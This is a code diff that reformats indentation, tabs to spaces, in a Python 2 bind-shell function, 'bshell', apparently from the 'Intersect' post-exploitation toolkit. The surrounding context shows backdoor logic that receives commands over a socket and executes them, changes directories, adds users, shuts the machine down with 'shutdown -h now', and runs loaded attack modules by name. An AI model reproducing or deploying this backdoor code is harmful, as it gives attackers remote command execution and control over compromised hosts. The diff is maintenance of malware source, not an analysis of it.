@@ -12,7 +12,7 @@ def bshell():
         conn.send("\nIntersect "+str(os.getcwd())+" => ")
     except:
         print "[!] Connection closed."
-    	sys.exit(2)
+        sys.exit(2)
     
     while True:
         cmd = conn.recv(socksize)
@@ -25,13 +25,13 @@ def bshell():
         stdout, stderr = proc.communicate()
 
         if cmd.startswith('cd'):
-	    destination = cmd[3:].replace('\n','')
+            destination = cmd[3:].replace('\n','')
             if os.path.isdir(destination):
-	        os.chdir(destination)
-	        conn.send("\nIntersect "+str(os.getcwd())+" => ")
+                os.chdir(destination)
+                conn.send("\nIntersect "+str(os.getcwd())+" => ")
             else:
-	        conn.send("[!] Directory does not exist") 
-	        conn.send("\nIntersect "+str(os.getcwd())+" => ")
+                conn.send("[!] Directory does not exist") 
+                conn.send("\nIntersect "+str(os.getcwd())+" => ")
 
         elif cmd.startswith('adduser'):
             strip = cmd.split(" ")
@@ -67,17 +67,17 @@ def bshell():
             conn.send("[!] Server system is going down for a reboot!")
             os.system("shutdown -h now")
 
-	elif cmd == ("extask"):
+        elif cmd == ("extask"):
             conn.send(str(modList))
-	    conn.send("\nIntersect "+str(os.getcwd())+" => ")
+            conn.send("\nIntersect "+str(os.getcwd())+" => ")
 
-	elif cmd.startswith("extask"):
+        elif cmd.startswith("extask"):
             getname = cmd.split(" ")
             modname = getname[1]
             if modname in modList is False:
                 conn.send("[!] Module not loaded!")
             else:
-		conn.send("[+] Executing %s " % modname)
+                conn.send("[+] Executing %s " % modname)
                 execmod = modname+"()"
                 execmod
 
